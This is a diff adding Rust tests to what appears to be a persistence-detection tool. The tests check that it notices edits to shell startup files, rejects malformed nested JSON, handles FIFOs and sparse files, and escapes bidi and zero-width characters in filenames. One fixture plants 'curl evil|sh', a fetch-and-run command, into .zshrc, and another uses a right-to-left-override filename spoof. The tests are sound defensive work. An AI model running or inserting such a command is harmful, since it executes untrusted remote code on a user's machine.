@@ -173,3 +173,66 @@ fn a_path_ending_in_carriage_return_round_trips_through_a_snapshot() {
     let (code, json) = run(&["persist", "--since", snap.to_str().unwrap(), "--strict", "--json"], &home);
     assert_eq!((code, json.trim()), (0, r#"{"changes":[]}"#));
 }
+
+// Second review round.
+
+#[test]
+fn a_same_size_edit_past_any_cap_is_detected() {
+    let home = scratch("big-zshrc");
+    let mut body = vec![b'#'; 17 << 20];
+    body.push(b'\n');
+    fs::write(home.join(".zshrc"), &body).unwrap();
+    let snap = home.with_extension("snapshot");
+    assert_eq!(run(&["persist", "--save", snap.to_str().unwrap()], &home).0, 0);
+    let tail = b"curl evil|sh\n";
+    let at = body.len() - tail.len();
+    body[at..].copy_from_slice(tail);
+    fs::write(home.join(".zshrc"), &body).unwrap();
+    assert_eq!(run(&["persist", "--since", snap.to_str().unwrap(), "--strict"], &home).0, 1);
+}
+
+#[test]
+fn invalid_json_beyond_the_depth_limit_is_rejected() {
+    let deep = "[".repeat(300);
+    for tail in ["} 1 2 ]", "{\"a\" 1 2 3]", "1,]"] {
+        let text = format!("{deep}{tail}{}", "]".repeat(299));
+        assert_eq!(json::parse(&text), None, "{tail}");
+    }
+    let valid = format!("{}{{\"a\": [1, \"]\"]}}{}", "[".repeat(300), "]".repeat(300));
+    assert!(json::parse(&valid).is_some());
+}
+
+#[test]
+fn a_fifo_in_place_of_the_snapshot_does_not_hang() {
+    let home = scratch("snap-fifo");
+    let snap = home.join("before.snapshot");
+    mkfifo(&snap);
+    assert_eq!(run(&["persist", "--since", snap.to_str().unwrap()], &home).0, 2);
+}
+
+#[test]
+fn a_huge_sparse_model_file_does_not_exhaust_memory() {
+    let home = scratch("sparse");
+    let dir = home.join(".lmstudio/models/x/y");
+    fs::create_dir_all(&dir).unwrap();
+    fs::File::create(dir.join("z.gguf")).unwrap().set_len(1 << 40).unwrap();
+    let (code, json) = run(&["models", "--json"], &home);
+    assert_eq!(code, 0);
+    assert!(json.contains("\"bytes\":1099511627776"), "{json}");
+}
+
+#[test]
+fn a_lone_surrogate_differs_from_the_same_text_with_a_backslash() {
+    let lone = json::parse(r#""\ud800""#).unwrap().canonical();
+    let text = json::parse(r#""\\ud800""#).unwrap().canonical();
+    assert_ne!(lone, text);
+}
+
+#[test]
+fn bidi_and_zero_width_characters_are_escaped_in_text_output() {
+    let home = scratch("bidi");
+    fs::write(autostart_dir(&home).join("evil\u{202e}tsil.plist\u{200b}"), b"x").unwrap();
+    let (_, text) = run(&["persist"], &home);
+    assert!(!text.contains('\u{202e}') && !text.contains('\u{200b}'), "{text}");
+    assert!(text.contains("evil\\u202etsil.plist\\u200b"), "{text}");
+}
